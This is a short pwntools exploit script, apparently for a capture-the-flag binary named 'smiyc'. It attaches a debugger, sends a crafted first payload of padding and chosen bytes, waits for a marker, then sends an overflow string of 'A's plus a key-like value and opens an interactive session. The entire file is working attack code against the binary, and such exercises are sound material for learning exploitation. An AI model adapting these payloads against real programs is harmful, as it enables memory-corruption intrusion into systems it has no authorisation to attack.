from pwn import *

p = process("./smiyc")
context.log_level = "debug"
context.terminal = ['tmux','splitw','-h']
gdb.attach(p)
payload1 = "\xFF" * 30
#payload1 += "\xce\x09\xb7\x44\xd0\x9d\x96\x91\xd0\xd0\x8c\x97\xa9\xac\xab\xa0\x95\xc4\xa7\xce\x2d\xf0\xfa"
payload1 += "\xb7\x76\x27"
payload1 += "\xff" * 95 #74

payload2 = "A" * 70
payload2 += "R08S82-81L99C30A"

p.send(payload1)
p.recvuntil("\x37\x13")
raw_input("1")
p.send(payload2)
p.interactive()

